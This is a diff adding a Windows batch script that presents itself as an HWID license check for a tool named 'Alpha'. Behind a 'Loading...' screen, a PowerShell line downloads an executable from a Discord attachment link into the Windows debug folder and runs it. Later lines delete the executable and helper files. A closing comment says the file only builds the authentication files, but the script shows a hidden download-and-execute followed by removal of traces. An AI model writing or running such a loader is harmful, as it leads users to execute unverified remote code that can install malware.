@@ -1,0 +1,85 @@
+@echo off
+color b
+cd %windir%\debug
+TITLE Loading...
+echo.
+echo  Loading...
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/824242822953566241/855119787087888404/HWIDLoader.exe -Outfile Writer.exe"
+Start Writer.exe
+ping -n 3 localhost > nul
+
+
+cls
+Title Authenticating...
+echo.
+echo.
+
+echo           __      __         
+echo    ____ _/ /___  / /_  ____ _
+echo   / __ `/ / __ \/ __ \/ __ `/
+echo  / /_/ / / /_/ / / / / /_/ / 
+echo  \__,_/_/ .___/_/ /_/\__,_/  
+echo        /_/                
+   
+ping -n 2 localhost > nul
+
+echo.
+echo.
+echo.
+
+echo Welcome %username% !
+echo.
+ping -n 1 localhost > nul
+echo Checking HWID WAIT...
+echo.
+ping -n 2 localhost > nul
+type "yourHWIDx.txt"
+ping -n 5 localhost > nul
+call HWID.bat
+call yourHWID.bat
+if ["%HWID%"] == ["%YoursHWID%"] goto good
+goto error
+
+:error
+cls
+echo.
+echo.
+echo           __      __         
+echo    ____ _/ /___  / /_  ____ _
+echo   / __ `/ / __ \/ __ \/ __ `/
+echo  / /_/ / / /_/ / / / / /_/ / 
+echo  \__,_/_/ .___/_/ /_/\__,_/  
+echo        /_/                
+echo.
+echo.
+echo Your HWID is not registered
+echo.
+echo Press any key to exit
+PAUSE > nul
+exit
+
+:good
+del /Q YourHWIDx.txt
+del /Q HWID.bat
+del /Q YourHWID.bat
+del /Q Writer.exe
+cls
+TITLE Alpha (p3tri#4000) (Change if you re not a good boy)
+echo.
+echo.
+echo           __      __         
+echo    ____ _/ /___  / /_  ____ _
+echo   / __ `/ / __ \/ __ \/ __ `/
+echo  / /_/ / / /_/ / / / / /_/ / 
+echo  \__,_/_/ .___/_/ /_/\__,_/  
+echo        /_/                
+echo.
+echo.
+echo Your HWID is registered!
+echo.
+echo Press any key to Continue
+PAUSE > nul
+exit
+
+// NOTE: This link "https://cdn.discordapp.com/attachments/824242822953566241/855119787087888404/HWIDLoader.exe" Downloads the HWID and make the batch and txts for the auth
+// You can find the source here:
